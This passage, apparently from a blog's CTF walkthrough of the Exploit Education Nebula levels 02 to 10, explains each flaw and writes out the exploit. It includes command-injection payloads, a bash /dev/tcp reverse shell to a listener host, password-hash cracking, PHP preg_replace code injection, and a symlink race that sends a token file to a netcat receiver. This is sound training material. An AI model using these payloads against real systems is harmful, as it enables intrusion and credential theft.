  asprintf(&amp;amp;buffer, &quot;/bin/echo %s is cool&quot;, getenv(&quot;USER&quot;));
  printf(&quot;about to call system(\&quot;%s\&quot;)\n&quot;, buffer);
  
  system(buffer);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Similar to level01, the environment variable can be changed to something like &lt;code class=&quot;highlighter-rouge&quot;&gt;; /bin/sh&lt;/code&gt; which when taken by the program and is executed as part of the &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; function results in command injection, successfully provided a shell in the context on flag02.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/nebula002.png&quot; alt=&quot;alt text&quot; title=&quot;image2&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;level03&quot;&gt;Level03&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://exploit.education/nebula/level-03/&quot;&gt;Link: https://exploit.education/nebula/level-03/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Level03 provides you with the following files. The hint in the challenge page explains that there is a crontab that is called every couple of minutes.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level03@nebula:/home/flag03$ la -la
total 6
drwxr-x--- 3 flag03 level03  103 2011-11-20 20:39 .
drwxr-xr-x 1 root   root     100 2012-08-27 07:18 ..
-rw-r--r-- 1 flag03 flag03   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag03 flag03  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag03 flag03   675 2011-05-18 02:54 .profile
drwxrwxrwx 2 flag03 flag03     3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03    98 2011-11-20 21:22 writable.sh
level03@nebula:/home/flag03$ cat writable.sh 
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x &quot;$i&quot;)
	rm -f &quot;$i&quot;
done

level03@nebula:/home/flag03$ ls -la writable.d/
total 0
drwxrwxrwx 2 flag03 flag03    3 2012-08-18 05:24 .
drwxr-x--- 3 flag03 level03 103 2011-11-20 20:39 ..

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Looking through the files, the &lt;code class=&quot;highlighter-rouge&quot;&gt;writable.sh&lt;/code&gt; shell script is world-write-executable and iterates through all files provided within the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/flag03/writable.d&lt;/code&gt; directory and runs thats using the bash terminal. The &lt;code class=&quot;highlighter-rouge&quot;&gt;ulimit&lt;/code&gt; command before the bash command controls the max processes per user limit. This just sets the get and set user limit to second 5. The &lt;code class=&quot;highlighter-rouge&quot;&gt;-x&lt;/code&gt; argument before bash checks to see if a file is executable before executing it.&lt;/p&gt;

&lt;p&gt;To solve this challenge, you can create a shell script similar to the following&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;

/bin/getflag &amp;gt;&amp;gt; /home/flag03/writable.d/flag03.out
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;and wait for it to be executed to get the flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/nebula003.png&quot; alt=&quot;alt text&quot; title=&quot;image3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;An alternative way to solve this solution is to create a shell script like the following &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.8/8080 0&amp;gt;&amp;amp;1&quot; &amp;gt; shell.sh&lt;/code&gt; and run &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -lvp 8080&lt;/code&gt; on your machine. When the shell script executes, it will then give you a reverse shell.&lt;/p&gt;

&lt;h2 id=&quot;level04&quot;&gt;Level04&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://exploit.education/nebula/level-04/&quot;&gt;Link: https://exploit.education/nebula/level-04/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Level04 requires you to read the token file, but the below code restricts the files that can be read.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf(&quot;%s [file to read]\n&quot;, argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], &quot;token&quot;) != NULL) {
      printf(&quot;You may not access '%s'\n&quot;, argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, &quot;Unable to open %s&quot;, argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
      err(EXIT_FAILURE, &quot;Unable to read fd %d&quot;, fd);
  }

  write(1, buf, rc);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;read&lt;/code&gt; function takes a system call used to read data into a buffer and the &lt;code class=&quot;highlighter-rouge&quot;&gt;write&lt;/code&gt; function is a system call that is used to write data out of a buffer. The &lt;code class=&quot;highlighter-rouge&quot;&gt;strstr&lt;/code&gt; is the function that does the check to see whether the file name matches the string “token” and provides an error if it is true. This function searches the given string in the specified main string and returns the pointer to the first occurrence of the given string.&lt;/p&gt;

&lt;p&gt;An easy way to bypass this check is by creating a symlink which points to the token file and read this file using the &lt;code class=&quot;highlighter-rouge&quot;&gt;flag04&lt;/code&gt; binary: &lt;code class=&quot;highlighter-rouge&quot;&gt;ln -s /home/flag04/token /home/flag04/test&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/nebula004.png&quot; alt=&quot;alt text&quot; title=&quot;image4&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;level05&quot;&gt;Level05&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://exploit.education/nebula/level-05/&quot;&gt;Link: https://exploit.education/nebula/level-05/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Level 5 challenge description states that your are looking for weak directory permissions. Going to the flag05 directory and listing the directory for all files, a &lt;code class=&quot;highlighter-rouge&quot;&gt;.backup&lt;/code&gt; directory can be seen. Inside this directory contains a .tgz file&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level05@nebula:~$ cd ../flag05/
level05@nebula:/home/flag05$ ls
level05@nebula:/home/flag05$ ls -la
total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     160 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
level05@nebula:/home/flag05$ cd .backup/
level05@nebula:/home/flag05/.backup$ ls
backup-19072011.tgz

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Extracting this tape archive file provides an ssh key, this ssh key can be used to ssh into the nebula system as the flag05 user.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level05@nebula:/tmp$ tar -xvzf backup-19072011.tgz 
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:/tmp$ ssh -i id_rsa flag05@192.168.1.3
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/nebula005.png&quot; alt=&quot;alt text&quot; title=&quot;image5&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;level06&quot;&gt;Level06&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://exploit.education/nebula/level-06/&quot;&gt;Link: https://exploit.education/nebula/level-06/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This challenge states that the flag06 account credentials came from a legacy unix system.&lt;/p&gt;

&lt;p&gt;Looking within the flag06 folder, no files can be found&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level06@nebula:/home/flag06$ ls -la
total 5
drwxr-x--- 2 flag06 level06   66 2011-11-20 20:51 .
drwxr-xr-x 1 root   root     200 2012-08-27 07:18 ..
-rw-r--r-- 1 flag06 flag06   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag06 flag06  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag06 flag06   675 2011-05-18 02:54 .profile
level06@nebula:/home/flag06$ 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;However, since the the hint states legacy unix system, the &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd/&lt;/code&gt; file can be checked.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level06@nebula:/home/flag06$ cat /etc/passwd | grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
level06@nebula:/home/flag06$ 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The password hash of the &lt;code class=&quot;highlighter-rouge&quot;&gt;flag06&lt;/code&gt; user can be seen within the passwd file.&lt;/p&gt;

&lt;p&gt;In legacy unix systems, password hashes of a user used to be stored within the &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file, this was then changed because &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file are world readable by all users.&lt;/p&gt;

&lt;p&gt;This password hash can then be cracked using John the ripper.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# cat hash.txt
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
root@kali:~# john hash.txt --show
flag06:hello:993:993::/home/flag06:/bin/sh
1 password hash cracked, 0 left
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/nebula006.png&quot; alt=&quot;alt text&quot; title=&quot;image6&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;level07&quot;&gt;Level07&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://exploit.education/nebula/level-07/&quot;&gt;Link: https://exploit.education/nebula/level-07/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The description for level07 states that a perl cgi script is in use that allows a user to ping hosts to see if they were reachable from a web server. The source of the program has also been provided.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/nebula007-1.png&quot; alt=&quot;alt text&quot; title=&quot;image7-1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the CGI script, it takes a parameter called “Host” and inserts that as part of the ping command which then gets executed. This script is vulnerable to Command Injection.&lt;/p&gt;

&lt;p&gt;The httpd config available within the &lt;code class=&quot;highlighter-rouge&quot;&gt;flag07&lt;/code&gt; directory also specifies what port the CGI script is running on.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level07@nebula:/home/flag07$ ls
index.cgi  thttpd.conf
level07@nebula:/home/flag07$ cat thttpd.conf 
# /etc/thttpd/thttpd.conf: thttpd configuration file

# This file is for thttpd processes created by /etc/init.d/thttpd.
# Commentary is based closely on the thttpd(8) 2.25b manpage, by Jef Poskanzer.

# Specifies an alternate port number to listen on.
port=7007

# Specifies a directory to chdir() to at startup. This is merely a convenience -
# you could just as easily do a cd in the shell script that invokes the program.
dir=/home/flag07
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;By making a curl request and chaining a command using the &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;&amp;amp;&lt;/code&gt; operator, it is possible to verify the command injection. This can be seen in the output below.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;snoopy@snoopy-MacBookPro:~/Documents$ curl http://192.168.1.3:7007/index.cgi?Host=127.0.0.1%20%26%26%20whoami
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;Ping results&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&lt;/span&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.024 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.023 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.015 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.015/0.020/0.024/0.006 ms
flag07
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/nebula007.png&quot; alt=&quot;alt text&quot; title=&quot;image7&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;level08&quot;&gt;Level08&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://exploit.education/nebula/level-08/&quot;&gt;Link: https://exploit.education/nebula/level-08/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Level 08 hints at World readable files being in use. Accessing the &lt;code class=&quot;highlighter-rouge&quot;&gt;flag08&lt;/code&gt; shows that a pcap file is available. This can be downloaded and accessed locally.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scp level08@192.168.1.3:/home/flag08/capture.pcap /home/snoopy/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Looking at this pcap file within Wireshark, the following can be seen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/nebula008-1.png&quot; alt=&quot;alt text&quot; title=&quot;image8-1&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;..wwwbugs login: l.le.ev.ve.el.l8.8
..
Password: backdoor...00Rm8.ate
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;A possible password is displayed, however it looks mangled. It was not possible to loging as &lt;code class=&quot;highlighter-rouge&quot;&gt;flag08&lt;/code&gt; using &lt;code class=&quot;highlighter-rouge&quot;&gt;backdoor...00Rm8.ate&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;backdoor00Rm8ate&lt;/code&gt;. Looking at the TCP/HTTP stream in HEX, the ASCII hex character &lt;code class=&quot;highlighter-rouge&quot;&gt;7f&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Od&lt;/code&gt; stands out.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/nebula008-2.png&quot; alt=&quot;alt text&quot; title=&quot;image8-2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By looking up both characters online, it is possible to deduce that &lt;code class=&quot;highlighter-rouge&quot;&gt;7f&lt;/code&gt; is the Delete keyboard character and &lt;code class=&quot;highlighter-rouge&quot;&gt;Od&lt;/code&gt; is the keyboard character.&lt;/p&gt;

&lt;p&gt;So the user typed in ‘backdoor’ then deleted the characters ‘oor’ and the inserted ‘00Rm8’, the character ‘8’ was then removed for ‘a’, making the actual password &lt;code class=&quot;highlighter-rouge&quot;&gt;backd00Rmate&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/nebula008-02.png&quot; alt=&quot;alt text&quot; title=&quot;image8-03&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;level09&quot;&gt;Level09&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://exploit.education/nebula/level-09/&quot;&gt;Link: https://exploit.education/nebula/level-09/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Level 09 provides the following source code.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php

function spam($email)
{
  $email = preg_replace(&quot;/\./&quot;, &quot; dot &quot;, $email);
  $email = preg_replace(&quot;/@/&quot;, &quot; AT &quot;, $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace(&quot;/(\[email (.*)\])/e&quot;, &quot;spam(\&quot;\\2\&quot;)&quot;, $contents);
  $contents = preg_replace(&quot;/\[/&quot;, &quot;&amp;lt;&quot;, $contents);
  $contents = preg_replace(&quot;/\]/&quot;, &quot;&amp;gt;&quot;, $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The above PHP code takes two arguments, &lt;code class=&quot;highlighter-rouge&quot;&gt;$filename&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;$use_me&lt;/code&gt;, However, only the &lt;code class=&quot;highlighter-rouge&quot;&gt;$filename&lt;/code&gt; parameter seems to be used. the file mentioned within the &lt;code class=&quot;highlighter-rouge&quot;&gt;filename&lt;/code&gt; parameter is then fetched, and is checked to see if a an array called ‘email’ is there, this can be verified by checking the provided regex:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/nebula009-01.png&quot; alt=&quot;alt text&quot; title=&quot;image9-01&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is then ran by the &lt;code class=&quot;highlighter-rouge&quot;&gt;preg_replace&lt;/code&gt; command to replace the dot and the @ symbols. Looking online, the following articles mention that &lt;code class=&quot;highlighter-rouge&quot;&gt;preg_replace&lt;/code&gt; is vulnerable to command injection.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;http://www.madirish.net/402&lt;/li&gt;
  &lt;li&gt;https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;First try indicates that the values inserted within the &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; command is only being echoed back.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level09@nebula:/home/flag09$ vi /tmp/file.txt 
level09@nebula:/home/flag09$ ./flag09 /tmp/file.txt
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
snoopy AT foo dot com; system(\'whoami\')
level09@nebula:/home/flag09$ 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;After trying multiple execution operators such as quotes, single quotes, backticks and much research, it looks like when providing a input similar to the below:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level09@nebula:/home/flag09$ cat /tmp/execute
$str = 'system(whoami)';
[email snoopy@foo.com $str] 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The script provides an error stating undefined variable.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level09@nebula:/home/flag09$ ./flag09 /tmp/execute foo
PHP Notice:  Undefined variable: str in /home/flag09/flag09.php(15) : regexp code on line 1
$str = 'system(whoami)';
snoopy AT foo dot com 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;It seems variables cannot be set and cannot be  called later on since all of this is being executed within preg_replace and then provided to the &lt;code class=&quot;highlighter-rouge&quot;&gt;spam()&lt;/code&gt; function.&lt;/p&gt;

&lt;p&gt;More research indicated that interpolation templates can be used to define variables: &lt;a href=&quot;https://stackoverflow.com/questions/43437121/php-string-interpolation-syntax/43437427&quot;&gt;https://stackoverflow.com/questions/43437121/php-string-interpolation-syntax/43437427&lt;/a&gt;. An example of this would be something like {$variable}. However, pre_replace is &lt;code class=&quot;highlighter-rouge&quot;&gt;eval&lt;/code&gt;ing any input, we could just try passing it arbitrary commands.&lt;/p&gt;

&lt;p&gt;Trying the following payload &lt;code class=&quot;highlighter-rouge&quot;&gt;[email snoopy@foo.com ${'whoami'}]&lt;/code&gt; sets a template as a variable which is the linux command ‘whoami’. However, this returns an error.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level09@nebula:/home/flag09$ ./flag09 /tmp/execute aaa
PHP Parse error:  syntax error, unexpected T_ENCAPSED_AND_WHITESPACE, expecting T_STRING in /home/flag09/flag09.php(15) : regexp code on line 1
PHP Fatal error:  preg_replace(): Failed evaluating code: 
spam(&quot;snoopy@foo.com ${\'whoami\'}&quot;) in /home/flag09/flag09.php on line 15

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This error is due to the single quotes in use, that can be replaced with backticks :&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[email snoopy@foo.com ${`whoami`}]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This payloads gets successfully interpreted as a command displayed the user the script is running as which is ‘flag09’.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level09@nebula:/home/flag09$ ./flag09 /tmp/execute aaa
PHP Notice:  Undefined variable: flag09
 in /home/flag09/flag09.php(15) : regexp code on line 1
snoopy AT foo dot com &amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This payload can now be modified to run &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/exploiteducation/nebula-009-02.png&quot; alt=&quot;alt text&quot; title=&quot;image9-02&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;level10&quot;&gt;Level10&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://exploit.education/nebula/level-10/&quot;&gt;Link: https://exploit.education/nebula/level-10/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Level10 contains a setuid binary which can upload a file given, but has certain restrictions.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc &amp;lt; 3) {
      printf(&quot;%s file host\n\tsends file to host if you have access to it\n&quot;, argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf(&quot;Connecting to %s:18211 .. &quot;, host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&amp;amp;sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&amp;amp;sin, sizeof(struct sockaddr_in)) == -1) {
          printf(&quot;Unable to connect to host %s\n&quot;, host);
          exit(EXIT_FAILURE);
      }

#define HITHERE &quot;.oO Oo.\n&quot;
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf(&quot;Unable to write banner to host %s\n&quot;, host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf(&quot;Connected!\nSending file .. &quot;); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf(&quot;Damn. Unable to open file\n&quot;);
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf(&quot;Unable to read from file: %s\n&quot;, strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf(&quot;wrote file!\n&quot;);

  } else {
      printf(&quot;You don't have access to %s\n&quot;, file);
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;An example of this can be seen below, where it is possible to send the &lt;code class=&quot;highlighter-rouge&quot;&gt;passwd&lt;/code&gt; file of the system to a remote host on port 18211. The port 18211 is specified by the program and cannot be changed. On the remote host, netcat can be used to receive the file (&lt;code class=&quot;highlighter-rouge&quot;&gt;nv -lvl 18211&lt;/code&gt;)
&lt;img src=&quot;/assets/exploiteducation/nebula-level10-01.png&quot; alt=&quot;alt text&quot; title=&quot;image10-01&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By analyzing the source code, it can be determined that the linux &lt;code class=&quot;highlighter-rouge&quot;&gt;access&lt;/code&gt; function is used for the check. By reading its man page &lt;a href=&quot;https://linux.die.net/man/2/access&quot;&gt;https://linux.die.net/man/2/access&lt;/a&gt; and looking at the warning section, it looks like the &lt;code class=&quot;highlighter-rouge&quot;&gt;access&lt;/code&gt; function is vulnerable to race conditions. Further research also points to this &lt;a href=&quot;http://www.cis.syr.edu/~wedu/Teaching/IntrCompSec/LectureNotes_New/Race_Condition.pdf&quot;&gt;http://www.cis.syr.edu/~wedu/Teaching/IntrCompSec/LectureNotes_New/Race_Condition.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Reading the above lecture notes, this program can be exploited by creating a file the user has access to, then create a symbolic link back to the forbidden token file, then the flag10 program can be run multiple times to trigger the race condition.&lt;/p&gt;

&lt;p&gt;This works because there is a short time window between executing the &lt;code class=&quot;highlighter-rouge&quot;&gt;access()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;open()&lt;/code&gt; functions. The window between the checking and using the file results in a Time-of-Check/Time-of-Use (TOCTOU) vulnerability. This is because the system might conduct context switch after access(), and run another process which will run as the &lt;code class=&quot;highlighter-rouge&quot;&gt;flag10&lt;/code&gt; user, so if you can read the file then, the token file will be fetched and successfully sent back.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level10@nebula:/tmp$ touch /tmp/accessiblefile
level10@nebula:/tmp$ while true; do ln -sf /home/flag10/token /tmp/token; \
&amp;gt; ln -sf /tmp/accessiblefile /tmp/token; done
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The above bash liner will create a symbolic link for a file between the token we want to access and a file we have access to, this &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/token&lt;/code&gt; can now be given to the &lt;code class=&quot;highlighter-rouge&quot;&gt;flag10&lt;/code&gt; program. The same approach can be done to run the flag program multiple times with the opportunity to read the token.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level10@nebula:/home/flag10$ while true; do ./flag10 /tmp/token 192.168.1.8; done
You don't have access to /tmp/token
You don't have access to /tmp/token
You don't have access to /tmp/token
You don't have access to /tmp/token
Connecting to 192.168.1.8:18211 .. Unable to connect to host 192.168.1.8
You don't have access to /tmp/token

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;On the host the program is connecting to, netcat can be run with continuous mode by using the &lt;code class=&quot;highlighter-rouge&quot;&gt;-k&lt;/code&gt; option.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;snoopy@snoopy-MacBookPro:~$ sudo nc -klvp 18211
Listening on [0.0.0.0] (family 0, port 18211)
Connection from 192.168.1.10 51669 received!
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
Connection from 192.168.1.10 51670 received!
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
Connection from 192.168.1.10 51671 received!
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
Connection from 192.168.1.10 51672 received!
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This token can then be used to SSH as the &lt;code class=&quot;highlighter-rouge&quot;&gt;flag10&lt;/code&gt; user and run the &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt; command.&lt;/p&gt;

